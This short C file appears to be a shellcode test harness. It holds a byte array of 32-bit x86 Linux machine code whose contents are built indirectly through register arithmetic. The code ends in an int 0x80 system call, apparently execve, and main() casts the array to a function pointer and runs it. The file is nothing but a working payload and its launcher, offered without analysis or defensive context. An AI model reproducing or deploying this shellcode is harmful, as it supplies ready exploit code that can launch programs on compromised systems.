#include <stdio.h>

char shellcode[]="\xb8\x46\x5a\x5a\x2d\xc1\xc8\x10\x50\x05\x08\x3f\x1f\x19\x50\x2d\xf9\xfb\xf0\x11\x50\x2d\x02\x02\x45\x32\x83\xc0\x02\x50\x05\xc6\xc0\x43\x33\x50\x89\xe6\x89\xf3\x99\x89\xd0\x88\x56\x10\x88\x56\x13\x52\x8d\x46\x11\x50\x56\x89\xe1\x52\x89\xd0\x89\xe2\x83\xc0\x0b\xcd\x80";

int main()
{
	int (*ret)() = (int(*)())shellcode;
	printf("Size: %d bytes.\n", sizeof(shellcode)); 
	ret();
}
